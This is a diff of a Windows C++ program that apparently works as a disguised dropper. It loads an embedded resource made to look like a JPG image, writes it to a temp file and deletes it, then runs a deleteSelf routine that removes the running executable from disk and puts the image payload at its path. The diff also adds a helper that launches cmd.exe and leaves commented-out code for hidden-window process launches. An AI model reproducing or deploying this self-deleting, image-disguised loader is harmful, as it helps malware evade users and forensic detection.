@@ -7,7 +7,7 @@
 #include "resource1.h"
 #include "pch.h"
 #include <shlwapi.h>
-#include "calls.h"
+//#include "calls.h"
 #include "olectl.h"
 #include <istream>
 #include <Gdiplus.h>
@@ -37,7 +37,7 @@ private:
 	membuf _buffer;
 };
 
-bool pipeDreemz() {
+bool pipeDreemz(LPCWSTR lpTempFileName, unsigned char* payload, unsigned int payload_len) {
 
 	const wchar_t lpszPipename[] = TEXT("\\\\.\\pipe\\myimage.jpg");
 	HANDLE hPipe = CreateFile(
@@ -191,7 +191,7 @@ int deleteSelf(unsigned char* payload, unsigned int payload_len) {
 			DS_DEBUG_LOG(L"failed to acquire handle to current running process");
 			return 0;
 		}		//overwrite file with jpg
-		writeFileToDisk((LPCWSTR)wcPath, payload, payload_len);
+		//writeFileToDisk((LPCWSTR)wcPath, payload, payload_len);
 
 		// rename the associated HANDLE's file name
 		DS_DEBUG_LOG(L"attempting to rename file name");
@@ -234,13 +234,94 @@ int deleteSelf(unsigned char* payload, unsigned int payload_len) {
 		}
 
 		DS_DEBUG_LOG(L"successfully deleted self from disk");
+
+		writeFileToDisk((LPCWSTR)wcPath, payload, payload_len);
 		return 1;
 	
 
 
 }
 
+int windows_system(wchar_t* cmd)
+{
+	LPSTR cmdline, programpath;
 
+	STARTUPINFO startup_info;
+	PROCESS_INFORMATION process_info;
+	memset(&startup_info, 0, sizeof(STARTUPINFO));
+	startup_info.cb = sizeof(STARTUPINFO);
+	memset(&process_info, 0, sizeof(PROCESS_INFORMATION));
+
+	//cmdline = strdup(TEXT(cmd));
+	//programpath = strdup(TEXT(cmd));
+	//cmd = L"cmd.exe";
+	//if (CreateProcess(NULL, (wchar_t*) L"wusa.exe", NULL, NULL, 0, CREATE_NO_WINDOW, NULL, NULL, &startup_info, &process_info))
+	if (!CreateProcess(L"C:\\Windows\\System32\\cmd.exe", cmd, NULL, NULL, 0, 0, NULL, NULL, &startup_info, &process_info))
+	{
+		return -1;
+	}
+	else {
+	WaitForSingleObject(process_info.hProcess, INFINITE);
+	CloseHandle(process_info.hProcess);
+	CloseHandle(process_info.hThread);
+	}
+	return 0;
+}
+
+//DWORD RunSilent(char* strFunct, char* strstrParams)
+//{
+//	STARTUPINFO StartupInfo;
+//	PROCESS_INFORMATION ProcessInfo;
+//	char Args[4096];
+//	char* pEnvCMD = NULL;
+//	char* pDefaultCMD = L"CMD.EXE";
+//	ULONG rc;
+//
+//	memset(&StartupInfo, 0, sizeof(StartupInfo));
+//	StartupInfo.cb = sizeof(STARTUPINFO);
+//	StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
+//	StartupInfo.wShowWindow = SW_HIDE;
+//
+//	Args[0] = 0;
+//
+//	pEnvCMD = getenv("COMSPEC");
+//
+//	if (pEnvCMD) {
+//
+//		strcpy(Args, pEnvCMD);
+//	}
+//	else {
+//		strcpy(Args, pDefaultCMD);
+//	}
+//
+//	// "/c" option - Do the command then terminate the command window
+//	strcat(Args, " /c ");
+//	//the application you would like to run from the command window
+//	strcat(Args, strFunct);
+//	strcat(Args, " ");
+//	//the parameters passed to the application being run from the command window.
+//	strcat(Args, strstrParams);
+//
+//	if (!CreateProcess(NULL, Args, NULL, NULL, FALSE,
+//		CREATE_NEW_CONSOLE,
+//		NULL,
+//		NULL,
+//		&StartupInfo,
+//		&ProcessInfo))
+//	{
+//		return GetLastError();
+//	}
+//
+//	WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
+//	if (!GetExitCodeProcess(ProcessInfo.hProcess, &rc))
+//		rc = 0;
+//
+//	CloseHandle(ProcessInfo.hThread);
+//	CloseHandle(ProcessInfo.hProcess);
+//
+//	return rc;
+//
+//}
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	LPSTR lpCmdLine, int nCmdShow) {
@@ -268,17 +349,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 
 	payload_len = SizeofResource(hModule, hResource);
 
-	//res = FindResource(NULL, MAKEINTRESOURCE(103), L"JPG");
-	//resHandle = LoadResource(NULL, res);
-	//payload = (unsigned char *)LockResource(resHandle);
-	//payload_len = SizeofResource(NULL, res);
-
-	//memstream ms(payload, payload_len);
-	//std::istream* msp = &ms;
-	//IStream is = msp;
 	wchar_t lpTempPathBuffer[MAX_PATH];
 	wchar_t szTempFileName[MAX_PATH];
 	DWORD retpath = GetTempPath(MAX_PATH, lpTempPathBuffer);
+	
 	if ( ! GetTempFileName(lpTempPathBuffer, // directory for tmp files
 		TEXT("DEMO"),     // temp file name prefix 
 		0,                // create unique name 
@@ -297,60 +371,41 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	LPCWSTR lpTempFileName = (LPCWSTR)dest.c_str();
 
 
-	//LPTSTR lpTempFileName = szTempFileName;
-
-	//lpTempFileName.app
-	//hFile = CreateFile(lpTempFileName, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	////hFile = CreateFileW(lpTempFileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	//if (hFile == INVALID_HANDLE_VALUE)
-	//{
-	//	//PrintError(TEXT("Second CreateFile failed"));
-	//	if (!CloseHandle(hFile))
-	//	{
-	//		//PrintError(TEXT("CloseHandle(hFile) failed"));
-	//		return (7);
-	//	}
-	//	return (2);
-	//}
-	//DWORD dwWritten = 0;
-
-	////WriteF
-	//if (!WriteFile(hFile, payload, payload_len, &dwWritten, NULL)) {
-	//	if (!CloseHandle(hFile))
-	//	{
-	//		//PrintError(TEXT("CloseHandle(hFile) failed")); 
-	//		return (7);
-	//	}
-	//	return 3;
-	//}
-
-	//CloseHandle(hFile);
 	writeFileToDisk(lpTempFileName, payload, payload_len);
 
+	//_wsystem(lpTempFileName);
+	LPWSTR comm = (LPWSTR)lpTempFileName;
 
-	//const char * fileName = (const char *)szTempFileName;
-	//const wchar_t* command = (const wchar_t*)lpTempFileName;
-	//std::wstring comm = lpTempFileName;
+	//windows_system(comm);
 
-	//const wchar_t* command = (const wchar_t*)comm.c_str();
-	//const wchar_t* command2 = L"C:\\Users\\d\\AppData\\Local\\Temp\\DEM8786.tmp.jpg";
-	
-	_wsystem(lpTempFileName);
+
+//	ShellExecute(NULL, L"open", comm, NULL, NULL, SW_SHOW);
+
 	DeleteFile(lpTempFileName);
-
-	//_wsystem(command2);
-
-	//Image image(L"Grapes.jpg");
-	//Graphics::DrawImage(&image, 60, 10);
-	//DrawImag
-
-	//OleLoadPicture(msp, 0, true, null, null);
-	
-	//_wsystem(L"C:\\Users\\d\\AppData\\Local\\Temp\\DEM8786.tmp.jpg");
-
 
 	deleteSelf(payload, payload_len);
 
+	//STARTUPINFO si;
+	//PROCESS_INFORMATION pi;
+
+	//ZeroMemory(&si, sizeof(si));
+	//si.cb = sizeof(si);
+	//ZeroMemory(&pi, sizeof(pi));
+	//if (!
+	//	CreateProcess
+	//	(
+	//		TEXT("C:\\Windows\\System32\\calc.exe"),
+	//		NULL, NULL, NULL, FALSE,
+	//		CREATE_NEW_CONSOLE,
+	//		NULL, NULL,
+	//		&si,
+	//		&pi
+	//	)
+	//	)
+	//{
+	//	return -1;
+	//}
+	
 
 	return 0;
 	// Allocate some memory buffer for payload
